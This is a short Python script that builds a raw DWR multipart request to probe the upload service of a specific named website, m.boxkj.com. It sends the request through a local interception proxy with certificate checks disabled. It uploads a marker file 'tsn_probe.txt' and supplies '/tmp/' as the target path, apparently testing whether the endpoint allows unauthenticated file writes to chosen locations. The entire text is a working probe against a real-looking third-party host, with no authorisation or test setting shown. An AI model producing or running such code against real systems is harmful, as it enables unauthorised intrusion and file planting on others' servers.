import sys, ssl, uuid, urllib.request
ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
opener=urllib.request.build_opener(urllib.request.ProxyHandler({'http':'http://127.0.0.1:7897','https':'http://127.0.0.1:7897'}), urllib.request.HTTPSHandler(context=ctx))
def call(method, params, file_idx, filename, content, page='/dwr/test/dwrUploadService'):
    b='----DWR'+uuid.uuid4().hex
    out=bytearray()
    def field(name,val):
        out.extend((f'--{b}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{val}\r\n').encode())
    field('callCount','1'); field('page',page); field('httpSessionId',''); field('scriptSessionId',''); field('batchId','0'); field('instanceId','0')
    field('c0-scriptName','dwrUploadService'); field('c0-methodName',method); field('c0-id','0')
    for i,p in enumerate(params):
        if i==file_idx: continue
        field(f'c0-param{i}', p)
    out.extend((f'--{b}\r\nContent-Disposition: form-data; name="c0-param{file_idx}"; filename="{filename}"\r\nContent-Type: application/octet-stream\r\n\r\n').encode())
    out.extend(content); out.extend(b'\r\n'); out.extend(f'--{b}--\r\n'.encode())
    req=urllib.request.Request(f'https://m.boxkj.com/dwr/call/plaincall/dwrUploadService.{method}.dwr', data=bytes(out), method='POST')
    req.add_header('Content-Type', f'multipart/form-data; boundary={b}')
    try:
        with opener.open(req,timeout=25) as r:
            print(f'[{method}] HTTP {r.status}: {r.read(4000).decode("utf-8","replace")}')
    except urllib.error.HTTPError as e:
        print(f'[{method}] HTTP {e.code}: {e.read(4000).decode("utf-8","replace")}')
call('uploadFile', ['tsn_probe.txt','','/tmp/'], 1, 'tsn_probe.txt', b'TSN_PROBE_CONTENT')
